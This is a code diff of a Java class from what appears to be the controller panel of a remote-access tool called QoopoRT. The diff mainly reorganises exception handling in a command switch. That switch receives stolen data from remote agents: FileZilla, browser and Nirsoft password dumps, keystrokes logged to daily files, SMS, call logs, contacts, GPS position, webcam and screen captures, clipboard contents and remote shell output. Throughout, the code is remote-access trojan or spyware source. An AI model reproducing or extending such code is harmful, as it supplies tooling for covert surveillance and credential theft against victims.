@@ -56,10 +56,6 @@ public class AsociadoV2 extends Asociado {
         super(conexion, tipoconexion, ssl, host, puerto);
     }
 
-//
-//    private void enviarComando(int i) {
-//        enviarObjeto(Asociado.crearComando(i, null));
-//    }
     @Override
     public synchronized void enviarComando(int i, Object... cmd) {
         enviarObjeto(Util.comprimirObjeto(Asociado.crearComando(i, cmd.length, cmd)));
@@ -68,7 +64,6 @@ public class AsociadoV2 extends Asociado {
     private void enviarObjeto(Object objeto) {
         try {
             conexion.escribirObjeto(objeto);
-//            conexion.flush();
             this.agregarEnviados(SizeUtil.sizeof(objeto));
         } catch (Exception ex) {
         }
@@ -87,392 +82,386 @@ public class AsociadoV2 extends Asociado {
                 parametro = null;
                 objeto = Util.descomprimirObjeto((byte[]) conexion.leerObjeto(), this);
                 contadorEstado = 0;
-                if (objeto instanceof Comando) {
-                    comando = (Comando) objeto;
-                    this.agregarRecibidos(SizeUtil.sizeof(comando));
-                    switch (comando.getComando()) {
-                        case Protocolo.PLUGINS_LISTAR:
-                            try {
-                            System.out.println("llega comando plugins listar");
-                            if (plugins != null) {
-                                plugins.actualizarListaPlugins((List<Plugin>) Util.leerParametro(comando));
-                            } else {
-                                System.out.println("la ventana es nula");
-                            }
-                        } catch (Exception e) {
-                            e.printStackTrace();
-                        }
-                        break;
-                        case Protocolo.GET_CURSOR:
-                            try {
-                            ImageIcon cursor = (ImageIcon) Util.leerParametro(comando);
-                            getEscritorioRemoto().cambiarCursorRemoto(cursor);
-                        } catch (Exception e) {
-                        }
-                        break;
-                        case Protocolo.AUTENTICAR:
-                            autenticar();
-                            break;
-                        case Protocolo.PUERTO_TRANSFERENCIA:
-                            try {
-                            parametro = (String) Util.leerParametro(comando);
-                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
-                            puertoTransferencia = Integer.valueOf(parametro);
-                        } catch (Exception e) {
-                        }
-                        break;
-                        case Protocolo.INFO:
-                            infoRecibida = true;
-                            if (accionInfo != null) {
-                                accionInfo.ejecutar();
-                            }
+                try {
+                    if (objeto instanceof Comando) {
+                        comando = (Comando) objeto;
+                        this.agregarRecibidos(SizeUtil.sizeof(comando));
+                        switch (comando.getComando()) {
+                            case Protocolo.PLUGINS_LISTAR:
+//                            try {
 
-                            try {
-
+                                if (plugins != null) {
+                                    plugins.actualizarListaPlugins((List<Plugin>) Util.leerParametro(comando));
+                                }
+//                            } catch (Exception e) {
+//                                e.printStackTrace();
+//                            }
+                                break;
+                            case Protocolo.GET_CURSOR:
+//                            try {
+                                ImageIcon cursor = (ImageIcon) Util.leerParametro(comando);
+                                getEscritorioRemoto().cambiarCursorRemoto(cursor);
+//                            } catch (Exception e) {
+//                            }
+                                break;
+                            case Protocolo.AUTENTICAR:
+                                autenticar();
+                                break;
+                            case Protocolo.PUERTO_TRANSFERENCIA:
+//                            try {
                                 parametro = (String) Util.leerParametro(comando);
                                 this.agregarRecibidos(SizeUtil.sizeof(parametro));
-                                datos = parametro.split(":");
-                                identificador = datos[1];
-                                datos[2] = conexion.getInetAddress().getHostAddress();
-                                ip = datos[2];
+                                puertoTransferencia = Integer.valueOf(parametro);
+//                            } catch (Exception e) {
+//                            }
+                                break;
+                            case Protocolo.INFO:
+                                infoRecibida = true;
+                                if (accionInfo != null) {
+                                    accionInfo.ejecutar();
+                                }
                                 try {
-                                    String[] m = datos[0].split("#");
-                                    pais = m[0];
-                                    bandera = m[1];
+                                    parametro = (String) Util.leerParametro(comando);
+                                    this.agregarRecibidos(SizeUtil.sizeof(parametro));
+                                    datos = parametro.split(":");
+                                    identificador = datos[1];
+                                    datos[2] = conexion.getInetAddress().getHostAddress();
+                                    ip = datos[2];
+                                    try {
+                                        String[] m = datos[0].split("#");
+                                        pais = m[0];
+                                        bandera = m[1];
+                                    } catch (Exception e) {
+                                        pais = datos[0];
+                                        bandera = "3";
+                                    }
+                                    usuario = datos[4];
+                                    host = datos[5];
+                                    so = datos[7];
+                                    webCam = datos[6];
+                                    setAndroid(so.toLowerCase().contains("android"));
+                                    try {
+                                        QoopoRT.instancia.actualizarDatosServidor(this);
+                                    } catch (Exception e) {
+                                    }
+                                    if (abrirEscritoriRemotoAlconectar) {
+                                        abrirEscritorioRemoto();
+                                    }
                                 } catch (Exception e) {
-                                    pais = datos[0];
-                                    bandera = "3";
-                                }
-                                usuario = datos[4];
-                                host = datos[5];
-                                so = datos[7];
-                                webCam = datos[6];
-                                setAndroid(so.toLowerCase().contains("android"));
-                                try {
-                                    QoopoRT.instancia.actualizarDatosServidor(this);
-                                } catch (Exception e) {
-                                }
-                                if (abrirEscritoriRemotoAlconectar) {
-                                    abrirEscritorioRemoto();
-                                }
-                            } catch (Exception e) {
 
-                            }
-                            enviarComando(Protocolo.GET_USUARIO_IMAGEN);
+                                }
+                                enviarComando(Protocolo.GET_USUARIO_IMAGEN);
 
-                            if (accionListo != null) {
-                                accionListo.ejecutar();
-                            }
+                                if (accionListo != null) {
+                                    accionListo.ejecutar();
+                                }
 
-                            break;
-                        case Protocolo.GET_INFO_COMPLETA:
-                            parametro = (String) Util.leerParametro(comando);
-                            if (getInformacionGUI() != null) {
-                                getInformacionGUI().txtInfo.setText(parametro);
-                                getInformacionGUI().repaint();
-                            }
-                            //graba un archivo con la informacion en la carpeta del cliente 
-                            try {
+                                break;
+                            case Protocolo.GET_INFO_COMPLETA:
+                                parametro = (String) Util.leerParametro(comando);
+                                if (getInformacionGUI() != null) {
+                                    getInformacionGUI().txtInfo.setText(parametro);
+                                    getInformacionGUI().repaint();
+                                }
+                                //graba un archivo con la informacion en la carpeta del cliente 
+//                                try {
                                 if (dInfor != null) {
                                     Util.agregarTexto(new File(this.dInfor, "info_" + Util.nombreHora() + ".txt"), parametro);
                                 } else {
                                     System.out.println("no esta seteado el path de la info");
                                 }
-                            } catch (Exception e) {
-                                e.printStackTrace();
-                            }
-                            break;
+//                                } catch (Exception e) {
+//                                    e.printStackTrace();
+//                                }
+                                break;
 
-                        case Protocolo.INFO_CPU:
-                            double cpu1 = (double) Util.leerParametro(comando, 0);
-                            double cpu2 = (double) Util.leerParametro(comando, 1);
-                            if (monitorSistema != null) {
-                                monitorSistema.agregarDatoCPU(cpu1, cpu2);
-                            }
-                            break;
-                        case Protocolo.INFO_RAM:
-                            double libre = (double) Util.leerParametro(comando, 0);
-                            double ram = (double) Util.leerParametro(comando, 1);
-                            if (monitorSistema != null) {
-                                monitorSistema.agregarDatoRAM(libre, ram);
-                            }
-                            break;
+                            case Protocolo.INFO_CPU:
+                                double cpu1 = (double) Util.leerParametro(comando, 0);
+                                double cpu2 = (double) Util.leerParametro(comando, 1);
+                                if (monitorSistema != null) {
+                                    monitorSistema.agregarDatoCPU(cpu1, cpu2);
+                                }
+                                break;
+                            case Protocolo.INFO_RAM:
+                                double libre = (double) Util.leerParametro(comando, 0);
+                                double ram = (double) Util.leerParametro(comando, 1);
+                                if (monitorSistema != null) {
+                                    monitorSistema.agregarDatoRAM(libre, ram);
+                                }
+                                break;
 
-                        case Protocolo.GET_PORTAPAPELES:
-                            parametro = (String) Util.leerParametro(comando);
-                            if (portapapeles != null) {
-                                portapapeles.contenido.setText(parametro);
+                            case Protocolo.GET_PORTAPAPELES:
+                                parametro = (String) Util.leerParametro(comando);
+                                if (portapapeles != null) {
+                                    portapapeles.contenido.setText(parametro);
 //                                portapapeles.contenido2.setText(parametro);
-                                portapapeles.repaint();
-                            }
-                            break;
-                        case Protocolo.COMANDO_SHELL:
-                            parametro = (String) Util.leerParametro(comando);
-                            if (consola != null) {
-                                consola.vaciarcomando();
-                                consola.salida.append(parametro);
-                                consola.salida.setCaretPosition(consola.salida.getDocument().getLength());
-                                consola.repaint();
-                            }
-                            break;
-                        case Protocolo.CHAT_MENSAJE:
-                            parametro = (String) Util.leerParametro(comando);
-                            if (this.chat != null) {
-                                chat.salida.setCaretColor(Color.GREEN);
-                                chat.salida.append(parametro + "\n");
-                                chat.salida.setCaretPosition(chat.salida.getDocument().getLength());
-                                chat.salida.setCaretColor(Color.BLUE);
-                                chat.repaint();
-                            }
-                            break;
-                        case Protocolo.GET_MINIATURA_PANTALLA:
-                            recibirMiniatura((byte[]) Util.leerParametro(comando));
-                            break;
-                        case Protocolo.GET_MINIATURA_CAM:
-                            recibirMiniaturaWC((byte[]) Util.leerParametro(comando));
-                            break;
-                        case Protocolo.GET_USUARIO_IMAGEN:
-                            recibirImagenUsuario((byte[]) Util.leerParametro(comando));
-                            break;
-                        case Protocolo.NO_WEB_CAM:
-                            recibirNoWebCam();
-                            break;
-                        case Protocolo.ADMIN_ARCHIVOS_LISTAR_ROOTS:
-                            if (!isAndroid()) {
-                                //si viene de un cliente pc
-                                recibirUnidades(Util.leerParametro(comando));
-                            } else {
-                                //si viene de un cliente android
-                                recibirUnidades((Object[]) comando.getObjeto());
-                            }
-                            break;
-                        case Protocolo.LISTAR_WEBCAMS:
-                            if (!isAndroid()) {
-                                //si viene de un cliente pc
-                                recibirListaWebCams(Util.leerParametro(comando));
-                            } else {
-                                //si viene de un cliente android
-                                recibirListaWebCams((Object[]) comando.getObjeto());
-                            }
-                            break;
-                        case Protocolo.GET_LISTA_DIMENSIONES_CAM:
-                            recibirListaWebCamsSizes(Util.leerParametro(comando));
-                            break;
-                        case Protocolo.GET_LISTA_MONITORES:
-                            if (!isAndroid()) {
-                                //si viene de un cliente pc
-                                recibirListaMonitores(Util.leerParametro(comando));
-                            } else {
-                                //si viene de un cliente android
-                                recibirListaMonitores((Object[]) comando.getObjeto());
-                            }
-                            break;
-                        case Protocolo.GET_LISTA_RESOLUCION:
-                            recibirListaResoluciones(Util.leerParametro(comando));
-                            break;
-                        case Protocolo.GET_RESOLUCION:
-                            anchoP = (int) Util.leerParametro(comando, 0);
-                            altoP = (int) Util.leerParametro(comando, 1);
-//                            this.getEscritorioRemoto().getContenedorPrincipal().getPantalla(0).setSize(new Dimension(anchoP, altoP));
-//                            this.getEscritorioRemoto().getContenedorPrincipal().getPantalla(0).setPreferredSize(new Dimension(anchoP, altoP));
-                            if (!this.getEscritorioRemoto().isPantallaCompleta()) {
-                                this.getEscritorioRemoto().getReproductor().getContenedor().setSize(new Dimension(anchoP, altoP));
-                                this.getEscritorioRemoto().getReproductor().getContenedor().setPreferredSize(new Dimension(anchoP, altoP));
-                                this.getEscritorioRemoto().repaint();
-                                this.getEscritorioRemoto().pack();
-                                GuiUtil.centrarVentana(getEscritorioRemoto(), anchoP, altoP);
-                            }
-
-                            break;
-                        case Protocolo.GET_LISTA_PROCESOS:
-                            recibirListaProcesos(Util.leerParametro(comando));
-                            break;
-                        case Protocolo.GET_LISTA_CONEXIONES:
-                            recibirListaConexiones(Util.leerParametro(comando));
-                            break;
-                        case Protocolo.GET_LISTA_EQUIPOS_RED:
-                            parametro = (String) Util.leerParametro(comando);
-                            if (this.redLan != null) {
-                                if (!redLan.isVisible()) {
-                                    redLan.setVisible(true);
+                                    portapapeles.repaint();
                                 }
-                                redLan.agregarFila(parametro);
-                                redLan.repaint();
-                            }
-                            break;
-                        case Protocolo.ADMIN_ARCHIVOS_LISTAR_DIRECTORIO:
-                            if (comando.getnParametros() == 1) {
-                                //si viene de un cliente pc
-                                recibirArchivos(Util.leerParametro(comando));
-                            } else {
-                                //si viene de un cliente android
-                                recibirArchivos((Object[]) comando.getObjeto());
-                            }
-
-                            break;
-                        case Protocolo.BUSCAR_ARCHIVO:
-                            recibirArchivosBusqueda(Util.leerParametro(comando));
-                            break;
-                        case Protocolo.BUSCAR_ARCHIVO_DETENER:
-                            if (this.adminArchivos != null) {
-                                if (!adminArchivos.isVisible()) {
-                                    adminArchivos.setVisible(true);
+                                break;
+                            case Protocolo.COMANDO_SHELL:
+                                parametro = (String) Util.leerParametro(comando);
+                                if (consola != null) {
+                                    consola.vaciarcomando();
+                                    consola.salida.append(parametro);
+                                    consola.salida.setCaretPosition(consola.salida.getDocument().getLength());
+                                    consola.repaint();
                                 }
-                                adminArchivos.detenerBusqueda();
-                                adminArchivos.repaint();
-                            }
-                            break;
-                        case Protocolo.ADMIN_ARCHIVOS_THUMBAIL:
-                            data = (byte[]) Util.leerParametro(comando);
-                            this.agregarRecibidos(SizeUtil.sizeof(data));
-                            this.recibirThumbail(data);
-                            break;
-                        case Protocolo.PASSWORDS_FILEZILLA:
-                            parametro = (String) Util.leerParametro(comando);
-                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
-                            if (passwords != null) {
-                                passwords.passFZ.setText(parametro);
-                                passwords.repaint();
-                            }
-                            break;
-                        case Protocolo.PASSWORDS_DM:
-                            parametro = (String) Util.leerParametro(comando);
-                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
-                            if (passwords != null) {
-                                passwords.passDM.setText(parametro);
-                                passwords.repaint();
-                            }
-                            break;
-                        case Protocolo.PASSWORDS_WEB:
-                            parametro = (String) Util.leerParametro(comando);
-                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
-                            if (passwords != null) {
-                                passwords.passWB.setText(parametro);
-                                passwords.repaint();
-                            }
-                            break;
-                        case Protocolo.PASSWORDS_NIRSOFT:
-                            parametro = (String) Util.leerParametro(comando);
-                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
-                            if (passwords != null) {
-                                passwords.passNirsoft.setText(parametro);
-                                passwords.repaint();
-                            }
-                            break;
-                        case Protocolo.GET_LISTA_OFFLINE:
-                            parametro = (String) Util.leerParametro(comando);
-                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
-                            if (this.archivosOffline != null) {
-                                archivosOffline.txtListaOffline.setText(parametro);
-                                archivosOffline.repaint();
-                            }
-                            break;
-                        case Protocolo.MENSAJE_SERVIDOR:
-                            parametro = (String) Util.leerParametro(comando);
-                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
-                            if (QoopoRT.instancia != null) {
-                                QoopoRT.instancia.ponerEstado("Agente (" + getInformacion() + "):" + parametro);
-                            }
-                            break;
-                        case Protocolo.PING:// enviamos PING
-                            enviarComando(Protocolo.PONG);
-                            break;
-                        case Protocolo.PONG:
-                            pong = System.currentTimeMillis();
-                            tiempoVida = pong - ping;
-                            pings--;
-                            if (infoRecibida) {
+                                break;
+                            case Protocolo.CHAT_MENSAJE:
+                                parametro = (String) Util.leerParametro(comando);
+                                if (this.chat != null) {
+                                    chat.salida.setCaretColor(Color.GREEN);
+                                    chat.salida.append(parametro + "\n");
+                                    chat.salida.setCaretPosition(chat.salida.getDocument().getLength());
+                                    chat.salida.setCaretColor(Color.BLUE);
+                                    chat.repaint();
+                                }
+                                break;
+                            case Protocolo.GET_MINIATURA_PANTALLA:
+                                recibirMiniatura((byte[]) Util.leerParametro(comando));
+                                break;
+                            case Protocolo.GET_MINIATURA_CAM:
+                                recibirMiniaturaWC((byte[]) Util.leerParametro(comando));
+                                break;
+                            case Protocolo.GET_USUARIO_IMAGEN:
+                                recibirImagenUsuario((byte[]) Util.leerParametro(comando));
+                                break;
+                            case Protocolo.NO_WEB_CAM:
+                                recibirNoWebCam();
+                                break;
+                            case Protocolo.ADMIN_ARCHIVOS_LISTAR_ROOTS:
+                                if (!isAndroid()) {
+                                    //si viene de un cliente pc
+                                    recibirUnidades(Util.leerParametro(comando));
+                                } else {
+                                    //si viene de un cliente android
+                                    recibirUnidades((Object[]) comando.getObjeto());
+                                }
+                                break;
+                            case Protocolo.LISTAR_WEBCAMS:
+                                if (!isAndroid()) {
+                                    //si viene de un cliente pc
+                                    recibirListaWebCams(Util.leerParametro(comando));
+                                } else {
+                                    //si viene de un cliente android
+                                    recibirListaWebCams((Object[]) comando.getObjeto());
+                                }
+                                break;
+                            case Protocolo.GET_LISTA_DIMENSIONES_CAM:
+                                recibirListaWebCamsSizes(Util.leerParametro(comando));
+                                break;
+                            case Protocolo.GET_LISTA_MONITORES:
+                                if (!isAndroid()) {
+                                    //si viene de un cliente pc
+                                    recibirListaMonitores(Util.leerParametro(comando));
+                                } else {
+                                    //si viene de un cliente android
+                                    recibirListaMonitores((Object[]) comando.getObjeto());
+                                }
+                                break;
+                            case Protocolo.GET_LISTA_RESOLUCION:
+                                recibirListaResoluciones(Util.leerParametro(comando));
+                                break;
+                            case Protocolo.GET_RESOLUCION:
+                                anchoP = (int) Util.leerParametro(comando, 0);
+                                altoP = (int) Util.leerParametro(comando, 1);
+                                if (!this.getEscritorioRemoto().isPantallaCompleta()) {
+                                    this.getEscritorioRemoto().getReproductor().getContenedor().setSize(new Dimension(anchoP, altoP));
+                                    this.getEscritorioRemoto().getReproductor().getContenedor().setPreferredSize(new Dimension(anchoP, altoP));
+                                    this.getEscritorioRemoto().repaint();
+                                    this.getEscritorioRemoto().pack();
+                                    GuiUtil.centrarVentana(getEscritorioRemoto(), anchoP, altoP);
+                                }
+                                break;
+                            case Protocolo.GET_LISTA_PROCESOS:
+                                recibirListaProcesos(Util.leerParametro(comando));
+                                break;
+                            case Protocolo.GET_LISTA_CONEXIONES:
+                                recibirListaConexiones(Util.leerParametro(comando));
+                                break;
+                            case Protocolo.GET_LISTA_EQUIPOS_RED:
+                                parametro = (String) Util.leerParametro(comando);
+                                if (this.redLan != null) {
+                                    if (!redLan.isVisible()) {
+                                        redLan.setVisible(true);
+                                    }
+                                    redLan.agregarFila(parametro);
+                                    redLan.repaint();
+                                }
+                                break;
+                            case Protocolo.ADMIN_ARCHIVOS_LISTAR_DIRECTORIO:
+                                if (comando.getnParametros() == 1) {
+                                    //si viene de un cliente pc
+                                    recibirArchivos(Util.leerParametro(comando));
+                                } else {
+                                    //si viene de un cliente android
+                                    recibirArchivos((Object[]) comando.getObjeto());
+                                }
+                                break;
+                            case Protocolo.BUSCAR_ARCHIVO:
+                                recibirArchivosBusqueda(Util.leerParametro(comando));
+                                break;
+                            case Protocolo.BUSCAR_ARCHIVO_DETENER:
+                                if (this.adminArchivos != null) {
+                                    if (!adminArchivos.isVisible()) {
+                                        adminArchivos.setVisible(true);
+                                    }
+                                    adminArchivos.detenerBusqueda();
+                                    adminArchivos.repaint();
+                                }
+                                break;
+                            case Protocolo.ADMIN_ARCHIVOS_THUMBAIL:
+                                data = (byte[]) Util.leerParametro(comando);
+                                this.agregarRecibidos(SizeUtil.sizeof(data));
+                                this.recibirThumbail(data);
+                                break;
+                            case Protocolo.PASSWORDS_FILEZILLA:
+                                parametro = (String) Util.leerParametro(comando);
+                                this.agregarRecibidos(SizeUtil.sizeof(parametro));
+                                if (passwords != null) {
+                                    passwords.passFZ.setText(parametro);
+                                    passwords.repaint();
+                                }
+                                break;
+                            case Protocolo.PASSWORDS_DM:
+                                parametro = (String) Util.leerParametro(comando);
+                                this.agregarRecibidos(SizeUtil.sizeof(parametro));
+                                if (passwords != null) {
+                                    passwords.passDM.setText(parametro);
+                                    passwords.repaint();
+                                }
+                                break;
+                            case Protocolo.PASSWORDS_WEB:
+                                parametro = (String) Util.leerParametro(comando);
+                                this.agregarRecibidos(SizeUtil.sizeof(parametro));
+                                if (passwords != null) {
+                                    passwords.passWB.setText(parametro);
+                                    passwords.repaint();
+                                }
+                                break;
+                            case Protocolo.PASSWORDS_NIRSOFT:
+                                parametro = (String) Util.leerParametro(comando);
+                                this.agregarRecibidos(SizeUtil.sizeof(parametro));
+                                if (passwords != null) {
+                                    passwords.passNirsoft.setText(parametro);
+                                    passwords.repaint();
+                                }
+                                break;
+                            case Protocolo.GET_LISTA_OFFLINE:
+                                parametro = (String) Util.leerParametro(comando);
+                                this.agregarRecibidos(SizeUtil.sizeof(parametro));
+                                if (this.archivosOffline != null) {
+                                    archivosOffline.txtListaOffline.setText(parametro);
+                                    archivosOffline.repaint();
+                                }
+                                break;
+                            case Protocolo.MENSAJE_SERVIDOR:
+                                parametro = (String) Util.leerParametro(comando);
+                                this.agregarRecibidos(SizeUtil.sizeof(parametro));
                                 if (QoopoRT.instancia != null) {
-                                    QoopoRT.instancia.actualizarDatosServidor(this);
+                                    QoopoRT.instancia.ponerEstado("Agente (" + getInformacion() + "):" + parametro);
                                 }
-                            }
-                            break;
-                        case Protocolo.UBICACION_GPS:
-                            try {
-                            GPSPosicion posicion = (GPSPosicion) Util.leerParametro(comando);
-                            if (mapa != null) {
-                                mapa.getMapa().updateMap(posicion.getLongitud(), posicion.getLatitud(), posicion.getAltitud(), posicion.getVelocidad(), posicion.getAcurrancy(), posicion.getTime(), posicion.getProveedor());
-                                mapa.getMapa().repaint();
-                                mapa.repaint();
-                            }
-                        } catch (Exception e) {
-                            e.printStackTrace();
-                        }
-                        break;
-                        case Protocolo.GET_LISTA_PROVEEDORES_GPS:
-                            List<String> provedores = ((ArrayList<String>) Util.leerParametro(comando));
-                            if (mapa != null) {
-                                try {
-                                    mapa.getProvedor().removeAllItems();
-                                } catch (Exception e) {
+                                break;
+                            case Protocolo.PING:// enviamos PING
+                                enviarComando(Protocolo.PONG);
+                                break;
+                            case Protocolo.PONG:
+                                pong = System.currentTimeMillis();
+                                tiempoVida = pong - ping;
+                                pings--;
+                                if (infoRecibida) {
+                                    if (QoopoRT.instancia != null) {
+                                        QoopoRT.instancia.actualizarDatosServidor(this);
+                                    }
                                 }
-                                for (String provedorGPS : provedores) {
-                                    mapa.getProvedor().addItem(provedorGPS);
+                                break;
+                            case Protocolo.UBICACION_GPS:
+//                            try {
+                                GPSPosicion posicion = (GPSPosicion) Util.leerParametro(comando);
+                                if (mapa != null) {
+                                    mapa.getMapa().updateMap(posicion.getLongitud(), posicion.getLatitud(), posicion.getAltitud(), posicion.getVelocidad(), posicion.getAcurrancy(), posicion.getTime(), posicion.getProveedor());
+                                    mapa.getMapa().repaint();
+                                    mapa.repaint();
                                 }
-                                mapa.repaint();
-                            }
-                            break;
-                        case Protocolo.GET_LISTA_CONTACTOS:
+//                            } catch (Exception e) {
+//                                e.printStackTrace();
+//                            }
+                                break;
+                            case Protocolo.GET_LISTA_PROVEEDORES_GPS:
+                                List<String> provedores = ((ArrayList<String>) Util.leerParametro(comando));
+                                if (mapa != null) {
+                                    try {
+                                        mapa.getProvedor().removeAllItems();
+                                    } catch (Exception e) {
+                                    }
+                                    for (String provedorGPS : provedores) {
+                                        mapa.getProvedor().addItem(provedorGPS);
+                                    }
+                                    mapa.repaint();
+                                }
+                                break;
+                            case Protocolo.GET_LISTA_CONTACTOS:
 //                            if (!isAndroid()) {
-                            recibirContactos(Util.leerParametro(comando));
+                                recibirContactos(Util.leerParametro(comando));
 //                            } else {
 //                                recibirContactos(comando.getObjeto());
 //                            }
-                            break;
-                        case Protocolo.GET_LISTA_SMS:
-                            recibirSMS(Util.leerParametro(comando));
-                            break;
-                        case Protocolo.GET_LISTA_LLAMADAS:
-                            recibirLlamadas(Util.leerParametro(comando));
-                            break;
-                        case Protocolo.KEYLOGGER_GET_TEXT:
-                            parametro = (String) Util.leerParametro(comando);
-                            if (this.keylogger != null) {
-                                keylogger.contenido.append(parametro);
-                                keylogger.repaint();
-                            }
-                            File f = new File(new File(new File(fKeylogger, sdfAnio.format(new Date())), sdfMes.format(new Date())), sdfDia.format(new Date()));
-                            if (!f.exists()) {
-                                f.mkdirs();
-                            }
-                            BufferedWriter out = null;
-                            try {
-                                out = new BufferedWriter(new FileWriter(new File(f, "keylogger.txt"), true));
-                                out.write(parametro);
-                            } finally {
-                                if (out != null) {
-                                    out.close();
+                                break;
+                            case Protocolo.GET_LISTA_SMS:
+                                recibirSMS(Util.leerParametro(comando));
+                                break;
+                            case Protocolo.GET_LISTA_LLAMADAS:
+                                recibirLlamadas(Util.leerParametro(comando));
+                                break;
+                            case Protocolo.KEYLOGGER_GET_TEXT:
+                                parametro = (String) Util.leerParametro(comando);
+                                if (this.keylogger != null) {
+                                    keylogger.contenido.append(parametro);
+                                    keylogger.repaint();
                                 }
-                            }
-                            out = null;
-                            break;
-                        case Protocolo.KEYLOGGER_NO_PLUGIN:
-                            if (keylogger != null) {
-                                keylogger.contenido.append("\n<<<NO HAY PLUGIN>>>\n");
-                                keylogger.repaint();
-                            }
-                            break;
-                        case Protocolo.ENVIAR_PORTAPAPELES:
-                            try {
-                            Object objPortapaleles = Util.leerParametro(comando);
-                            if (objPortapaleles != null) {
-                                if (this.escritorioRemoto.getItmClipboard().isSelected()) {
-                                    escritorioRemoto.getClipboard().setContent(objPortapaleles);
+                                File f = new File(new File(new File(fKeylogger, sdfAnio.format(new Date())), sdfMes.format(new Date())), sdfDia.format(new Date()));
+                                if (!f.exists()) {
+                                    f.mkdirs();
                                 }
-                            }
-                        } catch (Exception e) {
+                                BufferedWriter out = null;
+                                try {
+                                    out = new BufferedWriter(new FileWriter(new File(f, "keylogger.txt"), true));
+                                    out.write(parametro);
+                                } finally {
+                                    if (out != null) {
+                                        out.close();
+                                    }
+                                }
+                                out = null;
+                                break;
+                            case Protocolo.KEYLOGGER_NO_PLUGIN:
+                                if (keylogger != null) {
+                                    keylogger.contenido.append("\n<<<NO HAY PLUGIN>>>\n");
+                                    keylogger.repaint();
+                                }
+                                break;
+                            case Protocolo.ENVIAR_PORTAPAPELES:
+//                            try {
+                                Object objPortapaleles = Util.leerParametro(comando);
+                                if (objPortapaleles != null) {
+                                    if (this.escritorioRemoto.getItmClipboard().isSelected()) {
+                                        escritorioRemoto.getClipboard().setContent(objPortapaleles);
+                                    }
+                                }
+//                            } catch (Exception e) {
+//                            }
+                                break;
+                            case Protocolo.GET_KEYBOARD_LAYOUT:
+                                Locale locale = (Locale) Util.leerParametro(comando);
+                                QoopoRT.instancia.ponerEstado("Recibi configuracion teclado " + locale.toString());
+                                break;
+
                         }
-                        break;
-
-                        case Protocolo.GET_KEYBOARD_LAYOUT:
-                            Locale locale = (Locale) Util.leerParametro(comando);
-                            QoopoRT.instancia.ponerEstado("Recibi configuracion teclado " + locale.toString());
-                            break;
-
                     }
+                } catch (Exception e) {
+                    e.printStackTrace();
                 }
             }
-
         } catch (SocketException ex) {
             System.out.println("Error de socket " + getInfoIP()); //puede ser socekt closed
             ex.printStackTrace();
@@ -481,10 +470,8 @@ public class AsociadoV2 extends Asociado {
             contadorEstado++;
             System.out.println("Error EOF. Conexion cerrada " + getInfoIP());
             ex.printStackTrace();
-//            if (contadorEstado > 5) {
             contadorEstado = 0;
             desconectar();
-//            }
         } catch (StreamCorruptedException ex) {
             System.out.println("StreamCorruptedException " + getInfoIP()); //puede ser socekt closed
             ex.printStackTrace();
